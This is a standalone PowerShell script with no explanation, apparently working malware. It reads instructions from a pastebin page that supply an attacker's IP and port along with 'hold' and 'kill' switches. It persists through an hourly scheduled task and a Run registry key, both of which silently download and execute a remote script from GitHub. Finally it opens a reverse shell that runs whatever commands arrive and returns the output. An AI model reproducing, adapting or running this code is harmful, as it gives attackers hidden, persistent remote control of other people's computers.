$re = (IWR "https://pastebin.com/raw/8GebHvJ9")
$i, $p = $re.Content -split ':'

if ($re.Content -match 'hold') {
    Exit
}

if ($re.Content -match 'kill') {
    schtasks /Delete /TN "Start" /f
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /f
    Exit
}

schtasks /Create /TN "Start" /SC HOURLY /MO 1 /TR "cmd /c powershell -w hidden -c \"IEX (IWR https://raw.githubusercontent.com/rindonbrg/repo/master/rep0.ps1 -UseBasicParsing)\"" /F

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hidden -c \"IEX (IWR https://raw.githubusercontent.com/rindonbrg/repo/master/rep0.ps1 -UseBasicParsing)\"" /F

$c = New-Object System.Net.Sockets.TCPClient($i, $p)
$s = $c.GetStream()
[byte[]]$b = 0..65535 | ForEach-Object { 0 }
while (($z = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $z)
    $sb = (iex $d 2>&1 | Out-String)
    $sb2 = $sb + 'PS ' + (pwd).Path + '> '
    $sbB = ([text.encoding]::ASCII).GetBytes($sb2)
    $s.Write($sbB, 0, $sbB.Length)
    $s.Flush()
}
$c.Close()
